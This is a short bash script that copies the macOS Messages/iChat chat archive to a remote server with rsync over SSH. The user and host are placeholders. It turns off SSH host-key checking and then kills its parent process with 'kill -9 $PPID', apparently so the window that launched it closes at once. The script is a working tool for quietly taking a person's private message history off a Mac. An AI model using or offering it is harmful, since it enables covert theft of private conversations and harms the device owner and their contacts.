#!/bin/bash

#Variables 
user=USER
host=HOST
dir=~/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive/
serverdir=/send/to/directory/on/sever

rsync -ave "ssh -o StrictHostKeyChecking=no" $dir $user@$host:$serverdir


kill -9 $PPID
           
